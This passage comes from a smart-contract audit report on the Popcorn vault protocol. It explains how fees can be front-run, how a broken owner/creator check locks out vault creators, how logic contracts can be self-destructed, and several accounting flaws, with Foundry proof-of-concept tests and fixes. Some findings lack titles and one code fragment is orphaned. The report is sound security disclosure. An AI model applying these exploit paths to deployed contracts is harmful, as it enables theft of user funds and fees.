`takeFees` [modifier](https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L480-L494) is responsible for taking fees.

It calls `accruedPerformanceFee` function to calculate fees amount. 

<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L447-L460>

```solidity
    function accruedPerformanceFee() public view returns (uint256) {
        uint256 highWaterMark_ = highWaterMark;
        uint256 shareValue = convertToAssets(1e18);
        uint256 performanceFee = fees.performance;


        return
            performanceFee > 0 && shareValue > highWaterMark
                ? performanceFee.mulDiv(
                    (shareValue - highWaterMark) * totalSupply(),
                    1e36,
                    Math.Rounding.Down
                )
                : 0;
    }
```

As you can see, protocol has such variable as `highWaterMark`. This variable actually should store `convertToAssets(1e18)` amount at the time when last fee were accrued or after first deposit.
Then after some time when strategy earned some yields, `convertToAssets(1e18)` will return more assets than `highWaterMark`, so protocol will take fees.

But currently updating of `highWaterMark` is done incorrectly.

Deposit, mint, withdraw function [use `syncFeeCheckpoint` modifier](https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L138). 

<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L496-L499>

```solidity
    modifier syncFeeCheckpoint() {
        _;
        highWaterMark = convertToAssets(1e18);
    }
```

This modifier will update `highWaterMark` to current assets amount that you can receive for 1e18 of shares.

That means that every time when deposit, mint, withdraw is called, `highWaterMark` is updated to the new state, so protocol doesn't track yield progress anymore.

In case if protocol accrued some performance fees, which can be possible if noone called deposit, withdraw, mint for a long time, then anyone can frontrun `takeFees` and deposit small amount of assets in order to update `highWaterMark`, so protocol will not get any fees.

### Tools Used

VS Code

### Recommended Mitigation Steps

I believe that you need to store `highWaterMark = convertToAssets(1e18)` at the time of first deposit, or when totalShares is 0, this will be the value that protocol started with and then at time, when takefee was called you can calculate current convertToAssets(1e18) in case if it's bigger, than previous stored, then you can mint fees for protocol and update highWaterMark to current value.

### Impact

Modifier `VaultController._verifyCreatorOrOwner` does not work. Instead of checking the condition `msg.sender is creator OR owner`, it makes `msg.sender is creator AND owner`. This would block access to all created Vaults for creators and the owner (if he did not create them).

Specifically, the following functions in the `VaultController` are affected:

*   `addStakingRewardsTokens()`;
*   `deployVault()`, which has a call to `addStakingRewardsTokens()`, cannot be executed if the argument `rewardsData.length != 0`;
*   `pauseAdapters()`;
*   `pauseVaults()`;
*   `unpauseAdapters()`;
*   `unpauseVaults()`.

### Proof of Concept

To check this concept, we can make a truth table for the main condition in the modifier `msg.sender != metadata.creator || msg.sender != owner`. The table shows that the condition will equal `false` only in the one case where `msg.sender` is both creator and owner.

| msg.sender != metadata.creator | msg.sender != owner | msg.sender != metadata.creator \|\| msg.sender != owner |
| ------------------------------ | ------------------- | ------------------------------------------------------- |
| 0                              | 0                   | 0                                                       |
| 0                              | 1                   | 1                                                       |
| 1                              | 0                   | 1                                                       |
| 1                              | 1                   | 1                                                       |

The correct condition should be the following: `msg.sender != metadata.creator && msg.sender != owner`.

| msg.sender != metadata.creator | msg.sender != owner | msg.sender != metadata.creator && msg.sender != owner |
| ------------------------------ | ------------------- | ----------------------------------------------------- |
| 0                              | 0                   | 0                                                     |
| 0                              | 1                   | 0                                                     |
| 1                              | 0                   | 0                                                     |
| 1                              | 1                   | 1                                                     |

In this case, a revert will only happen when `msg.sender` is neither a creator nor the owner, as it should be according to the documentation.

You can also use the following test to check; add it to the file `test\vault\VaultController.t.sol`:

```solidity
function testFail__deployVault_creator_is_not_owner_audit() public {
    addTemplate("Adapter", templateId, adapterImpl, true, true);
    addTemplate("Strategy", "MockStrategy", strategyImpl, false, true);
    addTemplate("Vault", "V1", vaultImpl, true, true);
    controller.setPerformanceFee(uint256(1000));
    controller.setHarvestCooldown(1 days);
    rewardToken.mint(bob, 10 ether);
    rewardToken.approve(address(controller), 10 ether);

    swapTokenAddresses[0] = address(0x9999);
    address adapterClone = 0xD6C5fA22BBE89db86245e111044a880213b35705;

    address stakingClone = 0xE64C695617819cE724c1d35a37BCcFbF5586F752;

    uint256 callTimestamp = block.timestamp;
    vm.prank(bob);
    address vaultClone = controller.deployVault(
        VaultInitParams({
            asset: iAsset,
            adapter: IERC4626(address(0)),
            fees: VaultFees({
                deposit: 100,
                withdrawal: 200,
                management: 300,
                performance: 400
            }),
            feeRecipient: feeRecipient,
            owner: bob
        }),
        DeploymentArgs({id: templateId, data: abi.encode(uint256(100))}),
        DeploymentArgs({id: "MockStrategy", data: ""}),
        address(0),
        abi.encode(
            address(rewardToken),
            0.1 ether,
            1 ether,
            true,
            10000000,
            2 days,
            1 days
        ),
        VaultMetadata({
            vault: address(0),
            staking: address(0),
            creator: bob,
            metadataCID: metadataCid,
            swapTokenAddresses: swapTokenAddresses,
            swapAddress: address(0x5555),
            exchange: uint256(1)
        }),
        0
    );
}
```

In the test's log (`forge test --match-test "testFail__deployVault_creator_is_not_owner" -vvvv`), you can see that the call ended with revert `NotSubmitterNorOwner(0x000000000000000000000000000000000000000000000000DCbA)`.

# Medium Risk Findings (35)
## [[M-01] Vault creator can prevent users from claiming staking rewards](https://github.com/code-423n4/2023-01-popcorn-findings/issues/829)
*Submitted by [0xdeadbeef0x](https://github.com/code-423n4/2023-01-popcorn-findings/issues/829)*

Vault creator can prevent users from claiming rewards from the staking contract. This can boost his liquidity and lure depositors to stake vault tokens. He can present a high APY and low fee percentage which will incentivize stakers.

When the staking contract is empty of stakes, he can change the settings and claim all the rewards to himself.

### Proof of Concept

Vault creator receives management fees from two places:

1.  Deposits to the vault
2.  Rewards locked in escrow

Users can claim staking rewards by calling the `claimRewards` function of the staking contract: 

<https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L179>

      function claimRewards(address user, IERC20[] memory _rewardTokens) external accrueRewards(msg.sender, user) {
        for (uint8 i; i < _rewardTokens.length; i++) {
          uint256 rewardAmount = accruedRewards[user][_rewardTokens[i]];

          if (rewardAmount == 0) revert ZeroRewards(_rewardTokens[i]);

          EscrowInfo memory escrowInfo = escrowInfos[_rewardTokens[i]];

          if (escrowInfo.escrowPercentage > 0) {
            _lockToken(user, _rewardTokens[i], rewardAmount, escrowInfo);
            emit RewardsClaimed(user, _rewardTokens[i], rewardAmount, true);
          } else {
            _rewardTokens[i].transfer(user, rewardAmount);
            emit RewardsClaimed(user, _rewardTokens[i], rewardAmount, false);
          }

          accruedRewards[user][_rewardTokens[i]] = 0;
        }
      }

As can be seen above, if there is an escrow specified, percentage of rewards are sent to the escrow account through `_lockToken`: 

<https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L201>

      /// @notice Locks a percentage of a reward in an escrow contract. Pays out the rest to the user.
      function _lockToken(
        address user,
        IERC20 rewardToken,
        uint256 rewardAmount,
        EscrowInfo memory escrowInfo
      ) internal {
        uint256 escrowed = rewardAmount.mulDiv(uint256(escrowInfo.escrowPercentage), 1e18, Math.Rounding.Down);
        uint256 payout = rewardAmount - escrowed;

        rewardToken.safeTransfer(user, payout);
        escrow.lock(rewardToken, user, escrowed, escrowInfo.escrowDuration, escrowInfo.offset);
      }

`escrow.lock` will send fee to `feeRecipient` that is passed in the constructor of the escrow contract when there is a fee percentage defined. (This can be low in order to incentivize stakers) 

<https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardEscrow.sol#L111>

      constructor(address _owner, address _feeRecipient) Owned(_owner) {
        feeRecipient = _feeRecipient;
      }

    ------

      function lock(
        IERC20 token,
        address account,
        uint256 amount,
        uint32 duration,
        uint32 offset
      ) external {
    -----
        uint256 feePerc = fees[token].feePerc;
        if (feePerc > 0) {
          uint256 fee = Math.mulDiv(amount, feePerc, 1e18);

          amount -= fee;
          token.safeTransfer(feeRecipient, fee);
        }
    -----

The issue rises when `feeRecipient` is set to the zero address (0x0). `safeTransfer` will revert and the transaction of claiming rewards will fail (all the way through the `claimRewards` on the staking contract\`.

User funds will be locked in the contract.

The vault creator can decide when is the right time to open the rewards up (maybe when nobody is invested in the vault) by changing the fee percentage to 0 using `setFees`, which bypass sending fees to feeRecipient. if the vault owner will be the only saker, he can receive all the deposited tokens back.

## [[M-02] `quitPeriod` is effectively always just `1 day`](https://github.com/code-423n4/2023-01-popcorn-findings/issues/785)
*Submitted by [immeas](https://github.com/code-423n4/2023-01-popcorn-findings/issues/785), also found by [eccentricexit](https://github.com/code-423n4/2023-01-popcorn-findings/issues/635), [ayeslick](https://github.com/code-423n4/2023-01-popcorn-findings/issues/413), [0xBeirao](https://github.com/code-423n4/2023-01-popcorn-findings/issues/363), [Nyx](https://github.com/code-423n4/2023-01-popcorn-findings/issues/286), [chaduke](https://github.com/code-423n4/2023-01-popcorn-findings/issues/146), and [fyvgsk](https://github.com/code-423n4/2023-01-popcorn-findings/issues/90)*

The `quitPeriod` is supposed to give users time to rage quit if there are changes they don't agree with. The quit period is limited to be within 1 day and a week and can only be changed by `owner`:

```javascript
File: Vault.sol

629:    function setQuitPeriod(uint256 _quitPeriod) external onlyOwner {
630:        if (_quitPeriod < 1 days || _quitPeriod > 7 days)
631:            revert InvalidQuitPeriod();
632:
633:        quitPeriod = _quitPeriod;
634:
635:        emit QuitPeriodSet(quitPeriod);
636:    }
```

However the change can be done instantly. An owner can propose a change, users will expect to wait three days for it to be applied, and after one day change the `quitPeriod` to `1 day` and apply the changes.

### Impact

Changes to fees and adapters can happen faster than users expect not giving them time enough to react.

### Proof of Concept

Small PoC in `Vault.t.sol`:

```javascript
  function test__set_fees_after_1_day() public {
    vault.proposeFees(
      VaultFees({
        deposit: 1e17,
        withdrawal: 1e17,
        management: 1e17,
        performance: 1e17
      })
    );
    // users expect to have three days
    console.log("quit period",vault.quitPeriod());

    // jump 1 day
    vm.warp(block.timestamp + 1 days);
    // owner changes quit period
    vault.setQuitPeriod(1 days);
    // and does the changes
    vault.changeFees();
  }
```

### Tools Used

### Recommended Mitigation Steps

## [[M-03] `Vault::takeFees` can be front run to minimize `accruedPerformanceFee`](https://github.com/code-423n4/2023-01-popcorn-findings/issues/780)
*Submitted by [immeas](https://github.com/code-423n4/2023-01-popcorn-findings/issues/780), also found by [minhtrng](https://github.com/code-423n4/2023-01-popcorn-findings/issues/778), [bin2chen](https://github.com/code-423n4/2023-01-popcorn-findings/issues/627), [KIntern\_NA](https://github.com/code-423n4/2023-01-popcorn-findings/issues/576), [rbserver](https://github.com/code-423n4/2023-01-popcorn-findings/issues/575), [ustas](https://github.com/code-423n4/2023-01-popcorn-findings/issues/271), [rvierdiiev](https://github.com/code-423n4/2023-01-popcorn-findings/issues/76), and [yellowBirdy](https://github.com/code-423n4/2023-01-popcorn-findings/issues/30)*

`performanceFee` is a fee on the profits of the vault. The `feeRecipient` (or any user) can collect these at any point.

They rely on the difference between the current share value and the `highWaterMark` that records a historical share value.

The issue is that this `highWaterMark` is written on interactions with the vault: `deposit`, `mint`, `withdraw`. Hence a user can front run the fee collection with any of these calls. That will set the `highWaterMark` to the current share value and remove the performance fee.

### Impact

A malicious user can maximize the yield and deny any performance fee by front running the fee collection with a call to either `deposit`, `mint` or `withdraw` with only dust amounts.

### Proof of Concept

PoC test in `Vault.t.sol`

  function test__front_run_performance_fee() public {
   _setFees(0, 0, 0, 1e17); // 10% performance fee

    asset.mint(alice, 1e18);

    vm.startPrank(alice);
    asset.approve(address(vault), 1e18);
    vault.deposit(1e18);
    vm.stopPrank();

    asset.mint(address(adapter),1e18); // fake yield

    // performanceFee is 1e17 (10% of 1e18)
    console.log("performanceFee before",vault.accruedPerformanceFee());

    vm.prank(alice);
    vault.withdraw(1); // malicious user withdraws dust which triggers update of highWaterMark

    // performanceFee is 0
    console.log("performanceFee after",vault.accruedPerformanceFee());
  }
```

### Tools Used

VS Code, Forge

### Recommended Mitigation Steps

At every deposit, mint, redeem and withdraw, take fees before adding or removing the new users shares and assets.

## [[M-04] Total assets of yearn vault are not correct](https://github.com/code-423n4/2023-01-popcorn-findings/issues/728)
*Submitted by [hansfriese](https://github.com/code-423n4/2023-01-popcorn-findings/issues/728), also found by [rbserver](https://github.com/code-423n4/2023-01-popcorn-findings/issues/578)*

Total assets of yearn vault are not correct so the calculation between the asset and the shares will be wrong.

### Proof of Concept

In `YearnAdapter` the total assets of current `yValut` are extracted using `_yTotalAssets`.

        function _yTotalAssets() internal view returns (uint256) {
            return IERC20(asset()).balanceOf(address(yVault)) + yVault.totalDebt(); //@audit
        }

But in the yearn vault implementation, `self.totalIdle` is used instead of current balance.

    def _totalAssets() -> uint256:
        # See note on `totalAssets()`.
        return self.totalIdle + self.totalDebt

In yearn valut, `totalIdle` is the tracked value of tokens, so it is same as vault's balance in most cases, but the balance can be larger due to an attack or other's fault. Even `sweep` is implemented for the case in the vault implementation.

        if token == self.token.address:
            value = self.token.balanceOf(self) - self.totalIdle

        log Sweep(token, value)
        self.erc20_safe_transfer(token, self.governance, value)

So the result of `_yTotalAssets` can be inflated than the correct total assets and the calculation between the asset and the shares will be incorrect.

### Recommended Mitigation Steps

Use `yVault.totalIdle` instead of balance.

### Impact

AdapterBase based adapters instances like BeefyAdapter, and YearnAdapter can be rendered inoperable and halt the project.

### Proof of Concept

When using upgradeable smart contracts, all interactions occur with the contract instance, not the underlying logic contract.

A malicious actor sending transactions directly to the logic contract  does not pose a significant threat because changes made to the state of the logic contract will not affect the contract instance as the logic contract's storage is never utilized.

However, there is an exception to this rule. If a direct call to the logic contract results in a self-destruct operation, the logic contract will be eliminated, and all instances of your contract will delegate calls to a code-less address rendering all contract instances in the project inoperable.

Similarly, if the logic contract contains a delegatecall operation and is made to delegate a call to a malicious contract with a self-destruct function, the calling contract will also be destroyed.

The AdapterBase contract has an internal initializer function [\__AdapterBase_init](https://github.com/code-423n4/2023-01-popcorn/blob/dcdd3ceda3d5bd87105e691ebc054fb8b04ae583/src/vault/adapter/abstracts/AdapterBase.sol#L55-L79) that among the other things, allows to assign the strategy address (see [line 62](https://github.com/code-423n4/2023-01-popcorn/blob/dcdd3ceda3d5bd87105e691ebc054fb8b04ae583/src/vault/adapter/abstracts/AdapterBase.sol#L62), and [line 79](https://github.com/code-423n4/2023-01-popcorn/blob/dcdd3ceda3d5bd87105e691ebc054fb8b04ae583/src/vault/adapter/abstracts/AdapterBase.sol#L79)).

[AdapterBase](https://github.com/code-423n4/2023-01-popcorn/blob/dcdd3ceda3d5bd87105e691ebc054fb8b04ae583/src/vault/adapter/abstracts/AdapterBase.sol#L55-L79) excerpt:

```solidity
    function __AdapterBase_init(bytes memory popERC4626InitData)
        internal
        onlyInitializing
    {
        (
            address asset,
            address _owner,
            address _strategy,
            uint256 _harvestCooldown,
            bytes4[8] memory _requiredSigs,
            bytes memory _strategyConfig
        ) = abi.decode(
                popERC4626InitData,
                (address, address, address, uint256, bytes4[8], bytes)
            );
        __Owned_init(_owner);
        __Pausable_init();
        __ERC4626_init(IERC20Metadata(asset));

        INITIAL_CHAIN_ID = block.chainid;
        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();

        _decimals = IERC20Metadata(asset).decimals();

        strategy = IStrategy(_strategy);
```

The function harvest does a delegatecall to the address defined by strategy:

```solidity
    function harvest() public takeFees {
        if (
            address(strategy) != address(0) &&
            ((lastHarvest + harvestCooldown) < block.timestamp)
        ) {
            // solhint-disable
            address(strategy).delegatecall(
                abi.encodeWithSignature("harvest()")
            );
        }

        emit Harvested();
    }
```

An attacker can call the initializer method of the BeefyAdapter / YearnAdapter to pass a malicious contract to initialize the strategy address of AdapterBase, where the malicious contract only has a `harvest()` function or a fallback function that calls selfdestruct.

The attacker will then call harvest on BeefyAdapter / YearnAdapter implementation causing the logic contracts to be destroyed.

### Recommended Mitigation Steps

Add constructors and use OZ Initializable's `\_disableInitializers()` function as the only line of code in the constructor.

```solidity
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }
```

Also suggest the same for MultiRewardStaking and Vault contracts.

## [[M-06] In `MultiRewardStaking.addRewardToken()`, `rewardsPerSecond` is not accurate enough to handle all type of reward tokens.](https://github.com/code-423n4/2023-01-popcorn-findings/issues/619)
*Submitted by [hansfriese](https://github.com/code-423n4/2023-01-popcorn-findings/issues/619)*

The raw `rewardsPerSecond` might be too big for some ERC20 tokens and it wouldn't work as intended.

### Proof of Concept

As we can see from `_accrueStatic()`, the `rewardsPerSecond` is a raw amount without any multiplier.

```solidity
  function _accrueStatic(RewardInfo memory rewards) internal view returns (uint256 accrued) {
    uint256 elapsed;
    if (rewards.rewardsEndTimestamp > block.timestamp) {
      elapsed = block.timestamp - rewards.lastUpdatedTimestamp;
    } else if (rewards.rewardsEndTimestamp > rewards.lastUpdatedTimestamp) {
      elapsed = rewards.rewardsEndTimestamp - rewards.lastUpdatedTimestamp;
    }

    accrued = uint256(rewards.rewardsPerSecond * elapsed);
  }
```

But 1 wei for 1 second would be too big an amount for some popular tokens like WBTC(8 decimals) and EURS(2 decimals).

For WBTC, it will be 0.31536 WBTC per year (worth about `$7,200`) to meet this requirement, and for EURS, it must be at least 315,360 EURS per year (worth about `$315,000`).

Such amounts might be too big as rewards and the protocol wouldn't work properly for such tokens.

### Recommended Mitigation Steps

Recommend introducing a `RATE_DECIMALS_MULTIPLIER = 10**9(example)` to increase the precision of `rewardsPerSecond` instead of using the raw amount.

### Impact

For a vault that uses the `YearnAdapter` contract as its adapter, calling the `Vault.withdraw` or `Vault.redeem` function will eventually call the `AdapterBase._withdraw` and `YearnAdapter._protocolWithdraw` functions below when the adapter is not paused. When the `YearnAdapter._protocolWithdraw` function executes `yVault.withdraw(convertToUnderlyingShares(assets, shares))`, the `maxLoss` input is not specified when calling the Yearn vault's `withdraw` function below. Thus, the Yearn vault's `withdraw` function will be called with its default `maxLoss` input value that is 0.01%. If the total loss incurred during the withdrawal is more than 0.01%, calling the Yearn vault's `withdraw` function that executes `assert totalLoss <= maxLoss * (value + totalLoss) / MAX_BPS` will revert. In a bear market, it is possible that the Yearn vault's strategies do not perform well so the total loss can be more than 0.01% permanently. In this situation, calling the `Vault.withdraw` or `Vault.redeem` function will always revert because calling the Yearn vault's `withdraw` function without specifying the `maxLoss` input reverts. As a result, users lose the deposited assets that they are unable to withdraw.

1.  A vault that uses the `YearnAdapter` contract as its adapter exists.
2.  A user calls the `Vault.deposit` function to deposit some asset tokens in the corresponding Yearn vault.
3.  A bear market starts so the Yearn vault's strategies do not perform well, and the total loss is more than 0.01% consistently.
4.  Calling the `Vault.withdraw` or `Vault.redeem` function always reverts because the user cannot specify the `maxLoss` input for calling the Yearn vault's `withdraw` function. As a result, the user loses the deposited asset tokens.

### Tools Used

VS Code

### Recommended Mitigation Steps

The `YearnAdapter._protocolWithdraw` function can be updated to add an additional input that would be used as the `maxLoss` input for calling the Yearn vault's `withdraw` function. The other functions that call the `YearnAdapter._protocolWithdraw` function need to add this input as well.

## [[M-08] `VaultController()` Missing call `DeploymentController.nominateNewDependencyOwner()`](https://github.com/code-423n4/2023-01-popcorn-findings/issues/579)
*Submitted by [bin2chen](https://github.com/code-423n4/2023-01-popcorn-findings/issues/579), also found by [aashar](https://github.com/code-423n4/2023-01-popcorn-findings/issues/542), [ladboy233](https://github.com/code-423n4/2023-01-popcorn-findings/issues/455), and [chaduke](https://github.com/code-423n4/2023-01-popcorn-findings/issues/236)*

Unable to switch to a new deploymentController.

### Proof of Concept

The current protocol supports the replacement of the new DeploymentController, which can be switched by `VaultController.setDeploymentController()`.

Normally, when switching, the owner of the cloneFactory/cloneRegistry/templateRegistry in the old DeploymentController should also be switched to the new DeploymentController.

DeploymentController's `nominateNewDependencyOwner()` implementation is as follows:

```solidity
  /**
   * @notice Nominates a new owner for dependency contracts. Caller must be owner. (`VaultController` via `AdminProxy`)
   * @param _owner The new `DeploymentController` implementation
   */
  function nominateNewDependencyOwner(address _owner) external onlyOwner {
    IOwned(address(cloneFactory)).nominateNewOwner(_owner);
    IOwned(address(cloneRegistry)).nominateNewOwner(_owner);
    IOwned(address(templateRegistry)).nominateNewOwner(_owner);
  }
```

But there is a problem here, VaultConttroler.sol does not implement the code to call old_Deployerment.

`nominateNewDependencyOwner()`, resulting in DeploymentController can not switch properly, `nominateNewDependencyOwner()`'s Remarks:
``  Caller must be owner. (`VaultController` via `AdminProxy`) ``

But in fact the VaultController does not have any code to call the nominateNewDependencyOwner:

```solidity
  function setDeploymentController(IDeploymentController _deploymentController) external onlyOwner {
    _setDeploymentController(_deploymentController);
  }

  function _setDeploymentController(IDeploymentController _deploymentController) internal {
    if (address(_deploymentController) == address(0) || address(deploymentController) == address(_deploymentController))
      revert InvalidDeploymentController(address(_deploymentController));

    emit DeploymentControllerChanged(address(deploymentController), address(_deploymentController));

    deploymentController = _deploymentController;
    cloneRegistry = _deploymentController.cloneRegistry();
    templateRegistry = _deploymentController.templateRegistry();
  }
```

### Recommended Mitigation Steps

`setDeploymentController()` need call `nominateNewDependencyOwner()`:

```solidity
contract VaultController is Owned {
  function setDeploymentController(IDeploymentController _deploymentController) external onlyOwner {
    
+    //1. old deploymentController nominateNewDependencyOwner
+    (bool success, bytes memory returnData) = adminProxy.execute(
+       address(deploymentController),
+       abi.encodeWithSelector(
+         IDeploymentController.nominateNewDependencyOwner.selector,
+         _deploymentController
+       )
+     );
+     if (!success) revert UnderlyingError(returnData); 
+
+    //2. new deploymentController acceptDependencyOwnership
+    _deploymentController.acceptDependencyOwnership(); 

     _setDeploymentController(_deploymentController);        
  }

}
```

### Vulnerability details

Harvest method is called on every deposit or withdraw into the `Vault` which further calls into the provided strategy.

This calling into strategy is limited by the cool down period. But in the current implementation is not properly respected.

### Impact

Setting the cool down period for a strategy harvest callback method is not working properly so that on every deposit/withdraw into `Vault` also the strategy is called every time.

### Proof of Concept

The main problem is that `lastHarvest` state variable is only set in the constructor:

<https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L86>

and is not updated on strategy harvest method execution in the following lines:

### Recommended Mitigation Steps

For the cool down period to work correctly, update tha `lastHarvest` state variable like this:

```diff
    function harvest() public takeFees {
        if (
            address(strategy) != address(0) &&
            ((lastHarvest + harvestCooldown) < block.timestamp)
        ) {
+
+           lastHarvest = block.timestamp;

### Impact

The following `Vault.redeem` function does not use the `syncFeeCheckpoint` modifier, which is unlike the `Vault.withdraw` function below. Because of this, after calling the `Vault.redeem` function, `highWaterMark` is not sync'ed. In this case, calling functions like `Vault.takeManagementAndPerformanceFees` after the `Vault.redeem` function is called and before the `syncFeeCheckpoint` modifier is triggered will eventually use a stale `highWaterMark` to call the `Vault.accruedPerformanceFee` function. This will cause the performance fee to be calculated inaccurately in which the `feeRecipient` can receive more performance fee than it should receive or receive no performance fee when it should.

                )
                : 0;
    }
```

### Proof of Concept

The following steps can occur for the described scenario.

1.  A user calls the `Vault.redeem` function, which does not sync `highWaterMark`.
2.  The vault owner calls the `Vault.takeManagementAndPerformanceFees` function, which eventually calls the `accruedPerformanceFee` function.
3.  When calling the `Vault.accruedPerformanceFee` function, because `convertToAssets(1e18)` is less than the stale `highWaterMark`, no performance fee is accrued. If calling the `Vault.redeem` function can sync `highWaterMark`, some performance fee would be accrued through using such updated `highWaterMark` but that is not the case here.
4.  `feeRecipient` receives no performance fee when it should.

### Tools Used

VS Code

### Recommended Mitigation Steps

The `Vault.redeem` function can be updated to use the `syncFeeCheckpoint` modifier.

## [[M-11] Unchecked return of `execute()`](https://github.com/code-423n4/2023-01-popcorn-findings/issues/541)
*Submitted by [0xNazgul](https://github.com/code-423n4/2023-01-popcorn-findings/issues/541), also found by [Deivitto](https://github.com/code-423n4/2023-01-popcorn-findings/issues/640)*

Across the `VaultController.sol` there are many external calls to the `AdminProxy.sol` via `execute()`. Looking at the `execute()` function in `AdminProxy.sol`:

```solidity
function execute(address target, bytes calldata callData)
    external
    onlyOwner 
    returns (bool success, bytes memory returndata) 
{
    return target.call(callData);
}
```

As one can see it does a call to the target contract with the provided `callData`. Going back to the `VaultController.sol` the success of the call is check and reverts if unsuccessful. However, in one instance this check is missed and could cause issues.

### Proof of Concept

Looking at that specific instance:

```solidity
function __deployAdapter(
    DeploymentArgs memory adapterData,
    bytes memory baseAdapterData,
    IDeploymentController _deploymentController
  ) internal returns (address adapter) {
    (bool success, bytes memory returnData) = adminProxy.execute(
      address(_deploymentController),
      abi.encodeWithSelector(DEPLOY_SIG, ADAPTER, adapterData.id, _encodeAdapterData(adapterData, baseAdapterData))
    );
    if (!success) revert UnderlyingError(returnData);

    adapter = abi.decode(returnData, (address));

    adminProxy.execute(adapter, abi.encodeWithSelector(IAdapter.setPerformanceFee.selector, performanceFee));//@audit unchecked like the others are
}
```

It is clear that the last call to `AdminProxy.sol`'s `execute` is not checked.

### Recommended Mitigation Steps

Consider adding a check similar to how it is done in the rest of the contract.

## [[M-12] Vault Fees Can Total To More Than `1e18`](https://github.com/code-423n4/2023-01-popcorn-findings/issues/540)
*Submitted by [0xNazgul](https://github.com/code-423n4/2023-01-popcorn-findings/issues/540)*

Currently in `Vault.sol` there are four different fee types:

1.  Deposit
2.  Withdrawal
3.  Management
4.  Performance

There is a proper check to make sure that individually none of them are `>= 1e18`. However, they can total to more than `1e18` and cause unsuspecting users to pay more than they may want to.

### Proof of Concept

Just taking the deposit and withdrawal fees into account say both of them are set to `5e17`, totaling to `1e18`. If a user were to then deposit and withdraw, that would be 100%. Add in the other two fees and this situation gets even worse.

### Recommended Mitigation Steps

Consider making sure that the total of all four fee types is less than 1e18 instead of individually.

## [[M-13] vault.changeAdapter can be misused to drain fees](https://github.com/code-423n4/2023-01-popcorn-findings/issues/515)
*Submitted by [Lirios](https://github.com/code-423n4/2023-01-popcorn-findings/issues/515), also found by [ladboy233](https://github.com/code-423n4/2023-01-popcorn-findings/issues/734), [hansfriese](https://github.com/code-423n4/2023-01-popcorn-findings/issues/621), [KIntern\_NA](https://github.com/code-423n4/2023-01-popcorn-findings/issues/544), [csanuragjain](https://github.com/code-423n4/2023-01-popcorn-findings/issues/441), and [thecatking](https://github.com/code-423n4/2023-01-popcorn-findings/issues/215)*

The vault owner has an option to change the adapter for the vault.

The normal mechanism to change adapter is that the change should first be proposed by the owner via `proposeAdapter` and after a `quitPeriod`, it can be set via a call to `changeAdapter`.

After an owner has changed an adapter, any user is still able to call the `changeAdapter` function again. This will "change" the adapter to the same adapter, as `proposedAdapter` variable still has the same value as set by the owner.

This extra call will redeem all funds from the adapter, and deposit again to the same adapter.

*When this adapter charges any fees, this will result in a direct loss of assets.*

For example Beefy finance has a default withdrawal fee of 0.1%.

When the adapter has been set to a new BeefyAdapter, calling `changeAdapter`, will do a `_protocolWithdraw` and `_protocolDeposit` to deposit/withdraw all assets on the beefyvault. This results in a net loss of 0.1% of those assets, which will go to the beefyVault.

Repeatedly calling `changeAdapter` can cause a significant direct loss of user funds.

*note*:

calling `changeAdapter` before an owner has called `proposeAdapter` fails because `adapter.deposit` will revert when `adapter` is `address(0)`. But it is still recommended to check if `proposeAdapter` has been called when `changeAdapter` is executed.

### Proof of Concept

To test the scenario, I have created a new Mock contract to simulate an adapter that charges fees.

### Recommended Mitigation Steps

Implement better checks for `changeAdapter`. It is possible to add an `onlyOwner` modifier to this function. Other option is to check if `proposedAdapterTime` is set, and set `proposedAdapterTime` to 0 after `changeAdapter` has been called. This will allow only 1 call to `changeAdapter` for every `proposeAdapter` call.

If you are making a Lock fund for escrow using a fee on transfer token then contract will receive less amount (X-fees) but will record full amount (X). This becomes a problem as when claim is made then call will fail due to lack of funds. Worse, one user will unknowingly take the missing fees part from another user deposited escrow fund.

### Proof of Concept

1.  User locks token X as escrow which takes fee on transfer
2.  For same, he uses `lock` function which transfers funds from user to contract

<!---->

     function lock(
        IERC20 token,
        address account,
        uint256 amount,
        uint32 duration,
        uint32 offset
      ) external {
    ...
     token.safeTransferFrom(msg.sender, address(this), amount);
    ...
    escrows[id] = Escrow({
          token: token,
          start: start,
          end: start + duration,
          lastUpdateTime: start,
          initialBalance: amount,
          balance: amount,
          account: account
        });
    ...
    }

3.  Since token has fee on transfer, the contract receives only `amount-fees` but the escrow object is created for full `amount`

4.  Lets say escrow duration is over and claim is made using `claimRewards` function

<!---->

    function claimRewards(bytes32[] memory escrowIds) external {
    ...
     uint256 claimable = _getClaimableAmount(escrow);
    ...    
     escrow.token.safeTransfer(escrow.account, claimable);
    ...
    }

5.  Since full duration is over, the claimable amount is `amount`. But this fails on transfer to account since contract has only `amount-fees`

### Recommended Mitigation Steps

Compute the balance before and after transfer and subtract them to get the real amount. Also use nonReentrant while using this to prevent from reentrancy in ERC777 tokens.

## [[M-15] Management Fee for a vault is charged even when there is no assets under management and subject to manipulation.](https://github.com/code-423n4/2023-01-popcorn-findings/issues/499)
*Submitted by [ast3ros](https://github.com/code-423n4/2023-01-popcorn-findings/issues/499), also found by [rvierdiiev](https://github.com/code-423n4/2023-01-popcorn-findings/issues/74)*

<https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L429-L439>

<https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L473>

### Vulnerability details

`managementFee` is calculated by `accruedManagementFee` function:
\- managementFee x (totalAssets x (block.timestamp - feesUpdatedAt))/SECONDS_PER_YEAR <br><https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L429-L439>

### Impact 1

Management Fee for a vault is charged even when there is no assets under management.

